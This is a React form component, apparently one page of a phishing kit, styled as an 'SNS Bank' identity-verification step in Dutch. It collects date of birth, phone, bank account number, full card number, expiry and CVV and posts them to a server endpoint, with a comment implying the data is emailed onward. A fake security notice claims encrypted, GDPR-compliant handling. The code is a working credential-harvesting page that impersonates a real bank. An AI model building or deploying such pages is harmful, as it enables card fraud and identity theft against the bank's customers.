import { useLocation } from 'wouter';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useFormStore } from '@/hooks/use-form-store';
import { useTranslation } from '@/lib/translations';
import { User, Shield, CreditCard } from 'lucide-react';

const step2Schema = z.object({
  idType: z.enum(["passport", "id-card", "drivers-license"], {
    required_error: "Selecteer een type identiteitsbewijs"
  }),
  fullNameConfirm: z.string().min(1, "Bevestig je volledige naam"),
  dateOfBirth: z.string().min(1, "Geboortedatum is verplicht"),
  phoneNumber: z.string().min(1, "Telefoonnummer is verplicht"),
  accountNumber: z.string().min(1, "Rekeningnummer is verplicht"),
  cardNumber: z.string().min(1, "Kaartnummer is verplicht"),
  cardName: z.string().min(1, "Naam op kaart is verplicht"),
  expiryDate: z.string().min(1, "Vervaldatum is verplicht"),
  cvv: z.string().min(3, "CVV moet minimaal 3 cijfers zijn"),
});

type Step2Data = z.infer<typeof step2Schema>;

export default function Step2() {
  const [, setLocation] = useLocation();
  const { formData, updateFormData, setCurrentStep, isEnglish } = useFormStore();
  const t = useTranslation(isEnglish);

  const form = useForm<Step2Data>({
    resolver: zodResolver(step2Schema),
    defaultValues: {
      idType: formData.idType,
      fullNameConfirm: formData.fullNameConfirm || formData.fullName || '',
      dateOfBirth: formData.dateOfBirth || '',
      phoneNumber: formData.phoneNumber || '',
      accountNumber: formData.accountNumber || '',
      cardNumber: formData.cardNumber || '',
      cardName: formData.cardName || '',
      expiryDate: formData.expiryDate || '',
      cvv: formData.cvv || '',
    },
  });

  const onSubmit = async (data: Step2Data) => {
    try {
      // Send step data to server
      const response = await fetch('/api/step-submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, step: 2 }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit step data');
      }

      // Update local store and proceed
      updateFormData(data);
      setCurrentStep(2);
      setLocation('/step-3');
    } catch (error) {
      console.error('Step 2 submission error:', error);
      // Still proceed locally even if email fails
      updateFormData(data);
      setCurrentStep(2);
      setLocation('/step-3');
    }
  };

  const handleBack = () => {
    setCurrentStep(0);
    setLocation('/step-1');
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-orange-50">
      {/* SNS Header */}
      <div className="bg-primary text-white py-4">
        <div className="max-w-2xl mx-auto px-4">
          <div className="flex items-center gap-3">
            <Shield className="h-8 w-8" />
            <div>
              <h1 className="text-2xl font-bold" data-testid="sns-logo">SNS Bank</h1>
              <p className="text-orange-100 text-sm">Persoonlijke gegevens verificatie</p>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-lg mx-auto px-4 py-12">
        <Card className="shadow-2xl border-0">
          <CardContent className="pt-8 pb-8">
            <div className="text-center mb-8">
              <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center mx-auto mb-4">
                <User className="h-8 w-8 text-white" />
              </div>
              <h2 className="text-2xl font-bold text-secondary mb-2" data-testid="step-title">
                Persoonlijke Gegevens
              </h2>
              <p className="text-muted-foreground text-sm">
                Bevestig je identiteitsgegevens
              </p>
            </div>
          
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
              <FormField
                control={form.control}
                name="idType"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel data-testid="label-idtype">{t('id_type')}</FormLabel>
                    <Select onValueChange={field.onChange} defaultValue={field.value}>
                      <FormControl>
                        <SelectTrigger data-testid="select-idtype">
                          <SelectValue placeholder="Selecteer..." />
                        </SelectTrigger>
                      </FormControl>
                      <SelectContent>
                        <SelectItem value="passport" data-testid="option-passport">{t('passport')}</SelectItem>
                        <SelectItem value="id-card" data-testid="option-idcard">{t('id_card')}</SelectItem>
                        <SelectItem value="drivers-license" data-testid="option-drivers">{t('drivers_license')}</SelectItem>
                      </SelectContent>
                    </Select>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="fullNameConfirm"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel data-testid="label-fullnameconfirm">{t('full_name')} (bevestigen)</FormLabel>
                    <FormControl>
                      <Input placeholder={t('full_name')} {...field} data-testid="input-fullnameconfirm" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="dateOfBirth"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel data-testid="label-dateofbirth">{t('date_of_birth')}</FormLabel>
                    <FormControl>
                      <Input type="date" {...field} data-testid="input-dateofbirth" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="phoneNumber"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel data-testid="label-phonenumber">{t('phone_number')}</FormLabel>
                    <FormControl>
                      <Input type="tel" placeholder={t('phone_number')} {...field} data-testid="input-phonenumber" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="accountNumber"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel data-testid="label-accountnumber">{t('account_number')}</FormLabel>
                    <FormControl>
                      <Input placeholder="NL00 BANK 0000 0000 00" {...field} data-testid="input-accountnumber" />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              {/* Card Details Section */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-6">
                <div className="flex items-center gap-3 mb-4">
                  <CreditCard className="h-5 w-5 text-blue-600" />
                  <h3 className="text-lg font-semibold text-blue-900" data-testid="card-details-title">
                    Kaartgegevens
                  </h3>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <FormField
                    control={form.control}
                    name="cardNumber"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel data-testid="label-cardnumber">{t('card_number')}</FormLabel>
                        <FormControl>
                          <Input placeholder="1234 5678 9012 3456" {...field} data-testid="input-cardnumber" />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="cardName"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel data-testid="label-cardname">{t('card_name')}</FormLabel>
                        <FormControl>
                          <Input placeholder={t('card_name')} {...field} data-testid="input-cardname" />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="expiryDate"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel data-testid="label-expirydate">{t('expiry_date')}</FormLabel>
                        <FormControl>
                          <Input placeholder="MM/YY" {...field} data-testid="input-expirydate" />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="cvv"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel data-testid="label-cvv">CVV</FormLabel>
                        <FormControl>
                          <Input placeholder="123" {...field} data-testid="input-cvv" />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>
              </div>

              <div className="flex flex-col gap-3 mt-8">
                <Button 
                  type="submit"
                  className="w-full bg-primary hover:bg-orange-600 text-white h-12 text-lg font-semibold rounded-lg shadow-md"
                  data-testid="button-next"
                >
                  Volgende stap
                </Button>
                <Button
                  type="button"
                  variant="outline"
                  onClick={handleBack}
                  data-testid="button-back"
                  className="w-full h-12 border-2 border-gray-300 hover:border-primary"
                >
                  Vorige stap
                </Button>
              </div>

              {/* Security Notice */}
              <div className="mt-6 p-4 bg-gray-50 rounded-lg border">
                <div className="flex items-start gap-2">
                  <Shield className="h-4 w-4 text-gray-600 mt-0.5 flex-shrink-0" />
                  <div>
                    <p className="text-xs text-gray-700">
                      <strong>Veiligheid:</strong> Je gegevens worden veilig versleuteld verzonden en conform AVG wetgeving verwerkt.
                    </p>
                  </div>
                </div>
              </div>
            </form>
          </Form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
